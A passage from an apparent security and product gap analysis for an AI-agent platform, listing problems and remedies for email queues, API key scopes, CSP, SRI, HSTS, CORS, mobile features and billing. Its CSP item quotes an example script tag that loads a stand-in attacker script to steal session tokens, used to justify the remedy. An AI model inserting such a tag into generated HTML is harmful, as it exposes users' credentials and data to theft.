Include a one-click unsubscribe link in every marketing email (List-Unsubscribe header + visible link).

G-AI16 MEDIUM §Email — Transactional vs Marketing Email Queue Separation

Password Reset and Agent Digest Emails Share the Same Queue — Critical Emails Delayed by Low-Priority Bulk Mail

The Gap

All outbound emails (password reset, billing receipts, welcome emails, agent daily digests, marketing announcements) are sent through the same email queue with identical priority. When a burst of digest emails fills the queue (100K builder products × daily digest), password reset emails wait behind them and arrive minutes late. Password reset has a 15-minute expiry; a 10-minute queue delay leaves only 5 minutes for the user to click the link. This causes failed logins and support escalations.

Required Fix

Implement a two-tier email queue: CRITICAL (password reset, account verification, security alerts, billing failure) and BULK (digests, marketing, weekly reports). CRITICAL queue is consumed by a dedicated email worker with no concurrency limit. BULK queue is consumed at a rate-limited pace (max 1,000/min to protect ESP sender reputation). Classify email type at queue-write time by the notification category. SLA: CRITICAL emails delivered within 30 seconds of queue insertion; BULK emails within 5 minutes. Monitor SLA compliance via Analytics Engine and alert the ops team on CRITICAL queue depth >100.

G-AI17 MEDIUM §Email — Email Loop Prevention via Auto-Responder Headers

No Anti-Loop Headers on Outbound Emails — Auto-Responders Create Unbounded Reply Storms

The Gap

Platform-generated emails carry no Precedence: bulk or Auto-Submitted: auto-generated headers. If an end-user's mailbox has an out-of-office auto-responder configured, it will reply to every platform email. The platform's email handler (if it processes inbound email) will respond to the auto-reply, which triggers another auto-reply, creating an unbounded reply storm. This exhausts the platform's ESP email quota and can get the sending domain flagged as a spam source.

Required Fix

Add standard anti-loop headers to all outbound platform emails: Precedence: bulk (suppresses most auto-responders), Auto-Submitted: auto-generated, X-Auto-Response-Suppress: OOF, AutoReply. For inbound email processing (if implemented): check the Precedence, Auto-Submitted, and X-Auto-Response-Suppress headers before processing as a user message — discard any email with these headers rather than routing to an agent. Add a per-address email_loop_counter in KV; if more than 3 emails are received from the same address within 5 minutes, suppress further processing and alert the ops team.

G-AI18 HIGH §Developer Experience — Builder API Key Scope Management

No Scoped API Key Management for Builders — All Keys Have Full Access, No Read-Only or Limited-Scope Keys

The Gap

Builders interact with the Naelao API using a single API key with full access to all space operations. There is no ability to create: read-only keys (for analytics integrations), webhooks-only keys (for CI/CD deployment scripts), or per-space keys (for multi-space builders). If an API key is leaked (e.g., accidentally committed to GitHub), the attacker has full control over all the builder's spaces including billing, agent configuration, and user data. There is no key rotation, no expiry, and no last-used tracking.

Required Fix

Implement a BuilderAPIKeyDO per builderId: each key has (key_id, key_hash, scopes: string[], space_ids: string[] | "*", created_at, expires_at, last_used_at, description). Scopes: "spaces:read", "spaces:write", "analytics:read", "agents:run", "billing:read", "admin". Provide a key management UI in the builder dashboard: create, view, revoke, and set expiry. Hash keys with Argon2id before storage; verify on each request. Log last_used_at on every authenticated API call. Expose GET /api-keys/{id}/usage for anomaly detection. Emit key_created/key_revoked events to the security audit log.

G-AI19 MEDIUM §Developer Experience — Sandbox / Test Mode for Agent Development

No Test Mode That Skips Credit Deduction and Suppresses Real Emails and Webhooks

The Gap

Builders testing their agents must use real credits, which are deducted from their wallet. Real emails are sent to real addresses. Real webhooks are fired to production endpoints. Real Stripe charges may be triggered. This makes the development loop expensive (every agent run costs money), risky (accidental emails to real customers), and noisy (webhook endpoints fill with test events). There is no sandbox mode, no test credit toggle, and no way to stub external integrations.

Required Fix

Implement a test_mode flag per space (set in the builder dashboard or via API key header: X-Naelao-Test-Mode: true). In test mode: (1) wallet charges are simulated (no real deduction) with a test_balance that resets daily, (2) emails are redirected to a builder-configured test inbox (or Naelao's internal test mailbox), (3) webhooks are sent to a sandbox endpoint that logs but does not deliver, (4) Stripe calls use Stripe test-mode API keys, (5) agent responses are marked with a "TEST" badge in the UI. Test mode events are isolated in a separate Analytics Engine namespace so they don't pollute production metrics.

G-AI20 HIGH §Developer Experience — Developer Changelog and Breaking Change Notifications

No Public Changelog or Proactive Breaking Change Notifications — Builders Discover API Changes at Runtime

The Gap

The platform has no public changelog documenting API changes, SDK updates, or Space Type schema revisions. When the platform team makes a change (renames an API field, removes a deprecated endpoint, changes a webhook payload shape), builders discover it only when their integrations break in production. There is no semantic versioning of the API, no deprecation notice period, and no email notification to affected builders. This is incompatible with professional SaaS operations standards.

Required Fix

Publish a developer changelog at developers.naelao.com/changelog: categorised by type (breaking, added, fixed, deprecated), date, and affected component. For breaking changes: (1) add a deprecation notice to the old API endpoint (Deprecation response header with sunset date), (2) tag all API keys that have called the endpoint in the last 90 days as "affected", (3) email affected builders with the change details and migration guide. For SDK changes, use Changesets (G-AH37) to auto-generate CHANGELOG.md. Add a changelog RSS feed and a Slack webhook that builders can subscribe to for real-time change notifications.

G-AI21 MEDIUM §Developer Experience — Builder CLI Completeness

Builder CLI Missing Core Operations — No naelao logs, naelao test, or naelao spaces Commands

The Gap

The CLI has limited coverage: app publish and product deploy are partially implemented. Builders cannot: stream real-time agent logs from the terminal (naelao logs --space={id} --follow), run the agent test suite against a live space (naelao test --space={id}), list and manage their spaces (naelao spaces list/create/delete), inspect the current space config (naelao spaces describe {id}), or replay a failed agent run for debugging (naelao runs replay {runId}). Without these commands, CI/CD automation and developer debugging require the browser dashboard.

Required Fix

Extend the @naelao/cli package with commands: "naelao logs" (streams from Analytics Engine via Server-Sent Events, filterable by level/component/time), "naelao test" (runs the test suite defined in naelao.test.json against the specified space and returns pass/fail with detailed output), "naelao spaces list/create/describe/delete" (CRUD via the management API), "naelao runs list/describe/replay" (agent run management), "naelao deploy --dry-run" (validates manifest, checks bindings, does not apply). Publish to npm as a standalone package and include in the pnpm monorepo as apps/cli.

G-AI22 HIGH §Security / CSP — Generated HTML Artifact Content Security Policy

Agent-Rendered HTML Artifacts Have No CSP — XSS in Agent Output Enables Full Data Exfiltration

The Gap

Agents can generate and render HTML artifacts (interactive widgets, dashboards, data visualisations) that are served in iframes or directly in the product UI. These artifacts are rendered without a Content Security Policy header. An agent that is prompt-injected or that generates insecure HTML can include a <script src="https://attacker.com/steal.js"> tag that exfiltrates the end-user's session token, API key, or workspace data. The spec explicitly acknowledges this gap (§embeddable artifacts) but provides no remediation.

Required Fix

All agent-generated HTML artifacts must be served with a strict CSP: Content-Security-Policy: default-src 'none'; script-src 'nonce-{random}'; style-src 'nonce-{random}' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self'; frame-ancestors 'self'; form-action 'none'. Generate a fresh nonce per response. Scripts in agent-generated HTML must use the nonce attribute to execute. Serve all artifacts from a sandboxed subdomain (artifacts.naelao.com) with a null origin policy to prevent the artifact from accessing the parent frame's DOM. Run Lighthouse security audit on all artifact templates.

G-AI23 MEDIUM §Security / Supply Chain — Subresource Integrity for Third-Party Scripts

Third-Party Scripts Loaded Without SRI Hashes — CDN Compromise Enables Platform-Wide Script Injection

The Gap

The platform UI loads third-party resources (Google Fonts, icon CDNs, analytics scripts, charting libraries) without Subresource Integrity (SRI) hashes. If a CDN is compromised or if the third-party script URL resolves to malicious content (DNS hijack, CDN account breach), browsers will execute the malicious script with full access to the builder dashboard or end-user product UI. Major CDN compromises have occurred historically (Polyfill.io in 2024 was injected by new ownership to serve malware).

Required Fix

For every third-party resource included via <script src> or <link rel="stylesheet" href>: (1) compute the SHA-256/384 hash of the expected content, (2) add the integrity attribute: <script src="..." integrity="sha384-{hash}" crossorigin="anonymous">, (3) lock the version in the URL (no floating /latest/ URLs). Add a CI check that verifies all third-party resources have SRI hashes. For frequently-updated libraries, host self-managed copies in R2 (better control) rather than using public CDNs. Google Fonts: use a build-time downloader to self-host fonts in R2 to eliminate the Google CDN dependency entirely.

G-AI24 MEDIUM §Security / Headers — HSTS and Missing Security Headers

No Strict-Transport-Security Header — HTTP Downgrade Attacks Possible on First Visit

The Gap

The platform's HTTP responses include some security headers (X-Frame-Options, X-Content-Type-Options) but omit HTTP Strict Transport Security (HSTS). Without HSTS, a first-visit attacker who can perform a man-in-the-middle attack can downgrade HTTPS connections to HTTP before the browser knows to enforce HTTPS. Additionally, the platform is not in the HSTS preload list (browsers' built-in HTTPS-only list), so even users who have never visited the site are not protected. Missing: Referrer-Policy, Permissions-Policy headers.

Required Fix

Add HSTS header to all platform responses: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload. Start with max-age=86400 (1 day) for the first 30 days to allow rollback if HTTPS breaks, then increase to 1 year. Submit naelao.com to the HSTS preload list at hstspreload.org after the full max-age is stable. Add missing headers: Referrer-Policy: strict-origin-when-cross-origin, Permissions-Policy: camera=(), microphone=(self), geolocation=(). (Voice features require microphone self permission.) Verify with securityheaders.com and add a CI HTTP header check.

G-AI25 MEDIUM §Security / Supply Chain — Software Composition Analysis in CI

No Automated Dependency Vulnerability Scanning — Known CVEs in npm Packages Go Undetected

The Gap

The platform has 33+ Workers and 10+ shared packages, each with their own package.json. There is no automated SCA (Software Composition Analysis) in the CI pipeline. Known vulnerabilities in transitive dependencies (e.g., a high-severity CVE in a deeply nested npm package) are not surfaced until manually run. The spec mentions gitleaks for secret scanning but nothing for dependency vulnerabilities. An attacker who finds a high-severity CVE in a platform dependency has a long window to exploit it.

Required Fix

Add npm audit --audit-level=high to the CI pipeline as a required check (fails the build on high/critical CVEs). Enable GitHub Dependabot for automated PR creation when new CVEs are discovered. Add Snyk or Socket.dev for deeper supply chain analysis (detects malicious packages, typosquatting). Create a vulnerability SLA policy: critical CVE → patch within 24h, high → 7 days, medium → 30 days. Route CVE alerts to PagerDuty (G-AG22) at the appropriate priority. For packages that cannot be updated immediately, use npm overrides to pin the vulnerable transitive dependency to a patched version.

G-AI26 MEDIUM §Security / Operations — Annual Penetration Testing and Bug Bounty Program

No External Security Assessment or Bug Bounty Program — Zero External Validation of Security Posture

The Gap

The platform performs no scheduled penetration tests by external security firms and has no bug bounty program (HackerOne, Bugcrowd). Critical security assumptions (RBAC is correctly implemented, DO isolation holds, MCP credential encryption is sound) are never independently validated. Enterprise buyers ask for penetration test reports during security questionnaires; without one, sales cycles stall or deals are lost. Security researchers who find vulnerabilities have no responsible disclosure channel, increasing the risk of public zero-day disclosure.

Required Fix

Establish an annual penetration testing cadence: engage a qualified security firm (CREST/OSCP certified) for a black-box web application pen test covering at minimum: authentication bypass, privilege escalation, cross-tenant data access, injection attacks, and business logic flaws. Budget: 4-6 weeks of testing. Track all findings to closure with SLAs matching the CVE severity policy (G-AI25). Publish a Security page at naelao.com/security with: responsible disclosure policy, HackerOne bug bounty program details (start with private program), and a pointer to the latest pen test executive summary for enterprise prospects under NDA.

G-AI27 HIGH §Security / Embedding — Embeddable Widget CSP and iframe Origin Isolation

The Space-Assistant Embeddable Widget Has No CSP or Origin Isolation — Third-Party Contexts Can Steal Session Tokens

The Gap

The platform provides an embeddable <script> tag or <iframe> that third-party websites use to embed a Naelao-powered chat widget. This widget is loaded in an untrusted third-party context (a website the platform does not control). Without CSP on the widget's HTML frame, the third-party page can use postMessage to extract data from the widget, inject CSS to overlay UI (clickjacking), or exploit any XSS in the widget to steal end-user credentials. The spec explicitly acknowledges the embed spec is undefined.

Required Fix

Design the embed architecture for strict isolation: (1) the widget is served as an iframe (not inline script) from embed.naelao.com — a separate origin from naelao.com with its own strict CSP (no inline scripts, no access to parent origin), (2) the parent page communicates with the widget via a postMessage protocol with origin validation — the widget only accepts messages from origins explicitly allowlisted by the builder in their manifest, (3) the iframe has the sandbox attribute with "allow-scripts allow-same-origin allow-forms allow-popups", (4) widget sessions are independent of the parent page's auth session to prevent session token extraction.

G-AI28 HIGH §Mobile / Offline — Offline Message Queue with IndexedDB and Background Sync

Messages Composed Offline Are Lost on Connection Drop — No Client-Side Persistence or Background Sync

The Gap

When a mobile end-user composes a message and submits it while offline (or on a flaky connection), the fetch() call fails and the message is lost. There is no client-side persistence (IndexedDB) to hold unsent messages, no Background Sync API registration to replay them when connectivity returns, and no optimistic UI that shows the message as "pending." The user is left staring at an error toast with no way to recover their composed message. This is a fundamental mobile usability failure.

Required Fix

Implement a client-side message queue using IndexedDB: before submitting any message to the API, write it to an "outbox" IndexedDB store with a client_message_id (UUID). If the fetch() succeeds immediately, remove from outbox on response. If it fails: keep the message in outbox and register a Background Sync event (navigator.serviceWorker.ready. sync.register("message-sync")). The service worker's sync handler replays all outbox messages in order with the client_message_id as idempotency key. Show the queued message with a "Sending when online..." indicator. On successful server acknowledgment, update the message status in the UI.

G-AI29 HIGH §Mobile / Notifications — Critical Notification Delivery Fallback to Email

Critical Alerts Sent Only via Push — Device Offline or Push Disabled Causes Permanent Loss of Billing and Security Alerts

The Gap

Billing failure notifications, account security alerts (new device login, suspicious activity), and approval requests (billing threshold exceeded) are sent via the same push notification path as routine agent updates. If the end-user's device is offline, has push notifications disabled, or has low battery (OS background restrictions), critical alerts are silently lost with no retry and no escalation path. A builder whose account is suspended due to billing failure may not learn of it for days.

Required Fix

Implement a multi-channel escalation ladder for critical notification categories (billing, security, account): (1) attempt push delivery first, (2) if no read-receipt within 5 minutes, send email via the transactional email queue (G-AI16), (3) if no email open within 24 hours (track via a 1px transparent tracking pixel in the HTML email), fall back to a Twilio SMS for verified phone numbers. Track delivery and read state per notification in the notifications table (G-AI14). Add a user preference for critical notification channels (phone number for SMS) in the notification preferences (G-AI15).

G-AI30 MEDIUM §Mobile / Deep Linking — Deep Link URL Scheme for Mobile Navigation

No URL Scheme or Dynamic Link Infrastructure — Mobile Users Cannot Share Links to Specific Conversations or Spaces

The Gap

Mobile end-users who want to share a specific conversation, agent response, or space section with a colleague cannot do so via a deep link. There is no URL scheme (naelao://) for native apps, no dynamic link infrastructure (Firebase Dynamic Links or Branch.io) for deferred deep linking (install app, then navigate to the shared resource), and no builder-customisable share functionality. This limits user-driven virality and makes collaborative use cases impossible.

Required Fix

Implement a deep link format: https://{space_slug}.naelao.com/thread/{threadId}?msg={messageId}. For web: the SPA router handles the fragment and navigates directly to the referenced conversation. For PWA/native: configure the web app manifest with "scope" and "start_url" to allow deep link navigation on install. For deferred deep linking (user does not have the app): the link opens the web version and, if the PWA is then installed, the stored deep link path is replayed. Add a "Share conversation" button in the agent chat UI that generates a signed deep link URL (valid 30 days, verifies recipient is an authorised user of the space before granting access).

G-AI31 HIGH §Builder Experience — Guided First-Run Onboarding Wizard for New Builders

New Builders Start With a Blank Canvas and No Guided Setup — High Abandonment Rate From Zero-to-Value Friction

The Gap

When a builder creates a new account and first logs in, they are presented with an empty workspace. There is no guided onboarding flow: no space type selection wizard, no agent setup checklist, no "publish your first product" milestone tracker, no first-run tutorial overlay, and no sample space to explore. The time-to-value for new builders is undefined. For a no-code platform whose value proposition depends on builders quickly creating working products, a blank starting state is a critical retention failure.

Required Fix

Implement a 5-step onboarding wizard triggered for new builders: (1) "What are you building?" → select a Space Type and use case template, (2) "Name your product" → set space name, slug, description, (3) "Configure your AI agent" → guided agent instruction builder with fill-in-the-blank templates for the selected use case, (4) "Add your knowledge" → optional knowledge base upload with sample documents, (5) "Preview and publish" → in-browser agent preview with a test conversation. Track completion rate per step in Analytics Engine. Set a first_run_completed flag in the builder record after the wizard. Return to the wizard if abandoned after step 2.

G-AI32 MEDIUM §Discovery / Marketplace — Template Discovery Marketplace

No Searchable Template Catalog — Builders Cannot Browse or One-Click Apply Community Templates

The Gap

Space Templates are pre-loaded as static JSON blobs with no browsable catalog. Builders discover templates only through the builder dashboard's small curated list. Third-party developers cannot publish templates to a marketplace, rate them, or describe them with screenshots. The template system is a closed silo that prevents community-driven content creation and the compounding library that drives platform adoption (similar to Notion template gallery or Webflow template market).

Required Fix

Build a Template Marketplace at developers.naelao.com/templates: (1) templates are published by submitting a manifest JSON via POST /marketplace/templates (requires publisher account), (2) each listing has title, description, preview_url, screenshots, Space Type compatibility, rating, install_count, (3) a "Use this template" CTA creates a new space with the template pre-applied, (4) full-text search (Vectorize + BM25) over template metadata, (5) a review system (1-5 stars + text review) with moderation. Platform curates a "Featured" collection. Revenue share: paid templates (optional) split 80% publisher / 20% platform.

G-AI33 MEDIUM §Discovery / Marketplace — Composable Sub-Agent Marketplace

Builders Cannot Publish Custom Sub-Agents for Other Builders to Import — No Agent Composability Ecosystem

The Gap

Builders invest significant effort designing and tuning specialised sub-agents (a legal research agent, a data cleaning agent, a customer sentiment classifier). Currently these are locked to the builder's own spaces. There is no mechanism to package a sub-agent as a reusable component, publish it to a marketplace, let other builders import it with one click, and (optionally) monetise it. This prevents the composable agent ecosystem that would drive network effects.

Required Fix

Define an AgentPackage manifest: (name, version, description, inputs: JSON Schema, outputs: JSON Schema, instructions_template, default_tools, required_capabilities, price_model). Implement POST /marketplace/agents to publish. Imported agent packages are instantiated as sub-agents within the importing builder's space: the importing builder provides their own API key bindings; the original agent instructions run in isolation within the importer's execution tier. For paid agents: usage is metered via the platform billing system (N credits per run), with 80% revenue share to the publisher. Review process: 48h platform review of agent capabilities.

G-AI34 MEDIUM §Payment / Revenue Share — Three-Way Revenue Split Automation

No Automated Three-Way Revenue Split Between Platform, Builder, and App Developer on Monetised Events

The Gap

When an end-user makes a payment on a builder's product that uses a paid marketplace app (e.g., an AI writing app built by a third-party developer), three parties are entitled to revenue: the platform (infrastructure fee), the builder (product owner), and the app developer (component creator). The spec records revenue_share percentages in the registry_earnings table but never executes automated splits or payout transfers. The split calculation is never applied, and neither the builder nor the app developer receives their earned share.

Required Fix

Implement a RevenueSplitWorkflow triggered on charge completion: (1) query the space manifest for installed apps and their marketplace revenue share percentages, (2) calculate the split: platform_share = charge × 0.20 (configurable), app_developer_share = charge × app_revenue_share_pct (as declared in app manifest), builder_share = charge - platform_share - app_developer_share, (3) create Stripe Connect transfers to app developer's and builder's Connect accounts immediately after charge.succeeded webhook, (4) record all split entries in the double-entry ledger (G-AG24). Cap split complexity at 3 parties; additional app layers aggregate.

G-AI35 HIGH §Authentication — Email Verification Before Account Activation

Authentication Tokens Issued Before Email Ownership Is Verified — Account Takeover via Email Typo

The Gap

During registration, the platform issues a JWT immediately after the user submits their email and password, without verifying that the email address is real or owned by the registrant. If a user mistypes their email (e.g., john@gmail.com instead of john@gmial.com), their account is created and a JWT is issued. All future notifications go to the wrong address. More critically, if the typo'd address belongs to someone else, that person could (if they registered first) potentially trigger a password reset and take over the account.

Required Fix

Implement email verification gating: (1) on registration, create the account record with status="pending_verification", (2) generate a signed 24h verification token (HMAC-SHA256), (3) send verification email to the provided address, (4) only issue the authentication JWT after the verification link is clicked (GET /auth/verify?token={...}). During the pending period, allow read-only access to the dashboard but block space creation and billing. Add a "Resend verification email" button. After 7 days without verification, soft-delete the account. Allow email change with re-verification for existing accounts.

G-AI36 HIGH §Discovery / Search — Cross-Space Full-Text Search

End-Users Cannot Search Across Multiple Builder Spaces They Are Members Of — Discovery Requires Direct Navigation

The Gap

An end-user who is a member of 5 different builder products (a knowledge hub, a task manager, a legal research tool, a customer portal, and a project tracker) has no unified search to find a document or conversation they remember seeing but do not know which space it was in. Each space is a completely isolated silo. The platform provides no cross-space search index, no shared user inbox, and no "my activity across spaces" view. This limits the platform's value as a unified work surface.

Required Fix

Implement a cross-space search index (opt-in per space via the manifest setting: cross_space_search: true). When this is enabled, new content (documents, messages, agent outputs) from the space is indexed in a user-scoped search partition. Implement GET /search?q={query}&userId={id} that queries the cross-space Vectorize index (filtered by userId) and returns ranked results with space_name, space_slug, content_type, and a signed deep link URL (G-AI30). Results respect the source space's access control (only returns results from spaces the user is a member of). Present the search as a command palette (Cmd+K) in the user's unified portal.

G-AI37 MEDIUM §Mobile / File Upload — Camera and Cloud Storage File Upload on Mobile

Mobile File Upload Path Lacks Native Camera Picker and iCloud/Google Drive Access

The Gap

The document upload UI in builder products uses a standard HTML <input type="file"> element. On iOS, this does not natively expose the camera roll or live camera capture with proper metadata (location, orientation correction). On Android, it lacks deep integration with Google Drive or Samsung Files. For builder products in industries where mobile-captured images are primary inputs (insurance claims with photos, healthcare with lab result pictures, real estate with property photos), the upload experience is friction-heavy and often non-functional.

Required Fix

Replace the raw file input with a mobile-aware upload component: (1) on mobile, show a bottom sheet with options: Camera, Photo Library, Files (iCloud/Google Drive via the Web Share Target API and File System Access API), (2) for camera capture, use the capture="environment" attribute on the input for rear camera default, (3) for images, perform client-side HEIC→JPEG conversion (heic2any library) before upload to ensure compatibility, (4) display a progress indicator with upload size and estimated time on slow connections, (5) chunk large files (>10MB) using the Resumable Upload R2 multipart API for resilience on mobile connections.

G-AI38 LOW §Builder Experience / Mobile — Builder Canvas Touch and Gesture Support

Builder Canvas Has No Touch Gestures — Tablet Users Cannot Pinch-to-Zoom or Navigate by Touch

The Gap

The visual builder canvas (for configuring space layouts, agent flows, and capability connections) is designed for mouse interaction only. Tablet users (iPad, Surface) who want to build products on the go cannot pinch-to-zoom the canvas, pan with two-finger drag, or activate node operations by long-press. This severely limits the builder experience on tablets, which represent a meaningful segment of mobile-first creators and educators who are the target early builder demographic.

Required Fix

Add touch event handling to the builder canvas component: (1) pinch-to-zoom using the Pointer Events API (two pointer points calculating scale factor), (2) two-finger pan using pointer delta, (3) long-press (500ms) to open the context menu instead of right-click, (4) tap to select nodes, double-tap to open node settings, (5) use react-zoom-pan-pinch or similar library rather than implementing from scratch. Test on iOS Safari (WebKit) and Chrome for Android. Ensure all builder canvas keyboard shortcuts have touch equivalents documented in a "touch guide" in the builder help centre.

G-AI39 HIGH §Platform Admin — Admin Operations Panel Completeness

Platform Admin Panel Has Broken User-Ban Functionality and Cannot Perform Key Maintenance Operations

The Gap

The naelao-admin Worker has a broken user-ban endpoint (db reference error prevents execution). Beyond this, the admin panel is missing core operations: platform admins cannot view aggregated usage metrics across all builder spaces, cannot search and inspect any specific builder's space, cannot force-close a rogue agent run, cannot manually trigger the billing cycle for a specific builder, and cannot view the DLQ for failed operations. This means platform incidents require direct DO access via the Cloudflare dashboard instead of a purpose-built admin tool.

Required Fix

Build a comprehensive internal admin panel (restricted to Naelao staff via Cloudflare Access): (1) fix user-ban (correct the db reference, add ban audit logging), (2) space explorer (list all spaces with usage metrics, drill-down to space config, active agents, current credits), (3) agent run inspector (list active runs, force-terminate a run, view run logs), (4) manual billing operations (trigger cycle reset, issue credit grant, view ledger), (5) DLQ browser (view, replay, or discard failed messages per G-AG43), (6) platform health dashboard (error rates, queue depths, DO counts, R2 storage usage). All admin actions are logged to the compliance audit trail.

G-AI40 HIGH §Security / CORS — CORS Configuration Hardening

CORS May Be Configured Permissively — Wildcard or Over-Broad Origins Allow Cross-Site Authenticated Requests

The Gap

The API Gateway Worker sets CORS headers but the configuration is not validated against a strict allowlist. If Access-Control-Allow-Origin: * is set on any authenticated endpoint, any website can make cross-origin requests on behalf of a logged-in user (CSRF-equivalent risk for simple requests, and CORS is entirely bypassed for credentialless fetch). Builder dashboard APIs and the management API are the highest-risk targets. The spec acknowledges JWT authentication but CORS misconfiguration would allow an attacker to call APIs using the victim's cookies.

Required Fix

Implement a strict CORS allowlist: define ALLOWED_ORIGINS as a set { "https://naelao.com", "https://app.naelao.com", "https://*.naelao.com" }. In the CORS middleware: check if request Origin is in the allowlist; set Access-Control-Allow-Origin: {exact_origin} if matched; if not matched, return 403 (do not reflect arbitrary origins). Never set Access-Control-Allow-Origin: * on authenticated endpoints. For public APIs (marketplace, public space data), allow *, but ensure these endpoints never return user-specific data or accept authentication credentials (no cookies, no Authorization headers). Run CORS bypass tests in the security test suite.

G-AI41 HIGH §Payment / Subscriptions — Builder Product Subscription Plan Management

No Platform Primitive for Builders to Sell Recurring Subscription Plans to Their End-Users

The Gap

Builders who want to charge end-users a monthly or annual subscription fee for access to their product (standard SaaS model) have no platform support. There is no subscription plan definition (name, price, billing interval, feature gates), no Stripe subscription management, no billing portal for end-users to manage their plan, no proration on plan change, and no dunning for failed payments. Builders are forced to implement subscription billing from scratch in their agent instructions, which is impractical.

Required Fix

Implement a SubscriptionPlanDO per space: stores plan definitions (plan_id, name, price_cents, interval: "month"|"year", trial_days, feature_gates: string[]). On user subscription: create a Stripe Customer + Stripe Subscription for the end-user, store stripe_subscription_id in the user record, set plan_id and status="active". Handle Stripe subscription webhooks: invoice.payment_failed → status="past_due", customer.subscription.deleted → status="cancelled". Gate feature access in the agent by checking user.plan_id against feature_gates. Provide a Stripe-hosted billing portal link (billingPortal.sessions.create()) for users to manage their plan.

G-AI42 MEDIUM §Notifications — Critical Notification Delivery Confirmation

No Read-Receipt or Delivery Confirmation for Critical Notifications — Platform Cannot Verify User Was Reached

The Gap

When a billing failure notification or security alert is dispatched, the platform has no mechanism to verify whether the notification was actually delivered and read. FCM/APNs return delivery status but this is not recorded. Email opens are not tracked. In-app notifications have no read flag. If a critical alert is never seen (app uninstalled, email filtered, push disabled), the platform is unaware and does not escalate. Account suspensions can happen without the user ever being effectively notified.

Required Fix

Implement delivery tracking for critical notifications: (1) on FCM push: listen for the delivery receipt callback, update notifications.push_delivered_at, (2) on email: embed a 1×1 transparent tracking pixel at GET /n/{notificationId}/open that sets notifications.email_opened_at on request, (3) on in-app: mark notifications.read_at when the user opens the notification center, (4) escalation job (runs every 15 min): for critical notifications where none of the three channels has a delivery confirmation within 30 minutes, trigger the next escalation tier (G-AI29). Record the effective delivery time in Analytics Engine for SLA reporting.

G-AI43 MEDIUM §Developer Experience — Local Multi-Worker Development With Service Binding Simulation

Service Bindings Between Workers Do Not Resolve Locally — Cross-Worker Integration Testing Requires Remote Deployment

The Gap

Cloudflare Service Bindings (env.WORKER_NAME.fetch()) are the primary inter-Worker RPC mechanism. During local development with wrangler dev, each Worker runs in an isolated local process. Bindings to other Workers attempt to reach remote production services rather than locally-running counterparts. Developers cannot test cross-Worker flows (auth → agent → billing) locally. Every test requires a staging deployment, increasing iteration time from seconds to minutes.

Required Fix

Use Wrangler's --config flag and workers_dev routing to simulate Service Bindings locally: define a dev.vars file mapping Service Binding names to localhost:PORT addresses for locally-running Workers. Implement a DevOrchestrator script (scripts/dev-all.sh) that starts all 22 Workers on sequential ports (3001-3022) with a shared Miniflare state directory for KV/DO persistence. Use Miniflare's serviceBindings configuration to connect Workers. Document the local development setup in the CONTRIBUTING.md with a quick-start that takes a new developer from clone to working local environment in <10 minutes.

G-AI44 LOW §Discovery / Network Effects — Cross-Space Referral Infrastructure

No Referral Program or Cross-Space Collaboration Mechanism — Spaces Operate as Isolated Silos

The Gap

Builder products have no mechanism to drive referral growth: no referral link generator, no affiliate tracking, no "share this product" native feature, and no cross-space collaboration where users of one space can be invited to another (related) space. Unlike consumer social apps where virality is built in, these B2B SaaS products must acquire users entirely through the builder's own marketing channels. The platform provides no virality infrastructure even for builders who want it.

Required Fix

Implement a Referral primitive in the space manifest: { referral_enabled: bool, reward_type: "credit"|"discount"|"feature_unlock", reward_for_referrer, reward_for_referee }. Add a ReferralDO per (spaceId) that tracks (referral_code, referrer_userId, referred_users[], conversions[]). Expose a "Share" button in the product UI that generates a unique referral URL ({space_slug}.naelao.com?ref={code}). On signup via a referral URL, attribute the new user to the referrer and apply the configured reward. For cross-space collaboration, add a "Recommended spaces" widget that builders can configure to point to complementary spaces (with the referenced space's consent).

G-AI45 HIGH §Email Priority — Transactional Email Priority Queue Enforcement

Password Reset Links Delayed by Bulk Email Queue — 15-Minute Token Expiry Creates Auth Failures

The Gap

The platform sends all emails (password reset, digests, marketing) through the same Resend/Postmark API queue. During peak load (end-of-month billing cycle sends 1M digest emails), a password reset request queued behind the digest burst is delayed by 10-15 minutes. Password reset tokens expire in 15 minutes (standard security practice). A user who needs to reset their password at peak hours may find the link expired before the email arrives, requiring them to request again, which is again delayed. This is a user-facing authentication failure with no mitigation.

Required Fix

Route email sends through a priority classification layer before the ESP API: CRITICAL (password reset, 2FA codes, account verification, security alerts) → send immediately via synchronous ESP API call (no queue), with a 10-second timeout and 2 retries; STANDARD (billing receipts, agent completions) → CF Queue, process within 5 minutes; BULK (digests, marketing) → CF Queue, rate-limited to 500/minute, process within 1 hour. Generate password reset tokens with a 1-hour expiry (not 15 minutes) to provide buffer even in worst-case scenarios. Monitor critical email delivery latency in Analytics Engine.

G-AI46 HIGH §Authentication / Onboarding — Builder Dashboard Email Verification Gating

Builder Can Create Spaces and Spend Credits Before Verifying Email — Fraudulent Accounts Exploit Credits Without Valid Contact

The Gap

The builder registration flow issues a full authentication JWT immediately without verifying email ownership. A fraudulent builder who uses a disposable email address (per G-AG34) can immediately create spaces, receive free trial credits, run agents, and consume platform resources without ever providing a valid contact. If the account is suspended, the operator cannot contact the builder. Builder-created content (spaces, agents, knowledge) from unverified accounts creates moderation and legal compliance risks.

Required Fix

Enforce email verification as a prerequisite for credit grants and space creation (not for account creation itself — allow registration to proceed): (1) new builder accounts are created with email_verified: false and a free_trial_credits_granted: false flag, (2) when the builder first navigates to the dashboard, display a "Verify your email to unlock your free credits and start building" banner, (3) block space creation via API gate until email_verified = true, (4) on verification, grant free trial credits and lift the gate, (5) after 7 days without verification, delete the unverified account and all associated data.

G-AI47 MEDIUM §Analytics / Builder Tools — Named Event Schema Registry for Builders

Builders Cannot Define Named Analytics Event Types With Schemas — Custom Events Use Positional Arrays Without Documentation

The Gap

Builders who want to track custom business events in Analytics Engine (e.g., "quote_requested", "checkout_completed", "support_ticket_opened") must manually assign their fields to positional blobs[0-19] and doubles[0-19] arrays with no enforcement, no discovery, and no documentation of what occupies each position. Two Workflows that both write to blobs[5] with different fields produce uninterpretable data in aggregate queries. There is no schema registry where builders define named event types with typed fields.

Required Fix

Implement an EventSchemaRegistry in SpaceDO: builders define event types via POST /spaces/{id}/analytics/schemas: { name: "checkout_completed", fields: [{ name: "amount_cents", type: "double", position: 0 }, { name: "product_id", type: "blob", position: 0 }] }. The registry stores the schema and generates a typed Analytics Engine write helper: emit("checkout_completed", { amount_cents: 4999, product_id: "prod_123" }) which automatically maps fields to the correct positional arrays. Display the schema in the analytics query builder so SQL queries can use human-readable column aliases.

G-AI48 HIGH §Security / WAF — Application-Layer WAF Custom Rules

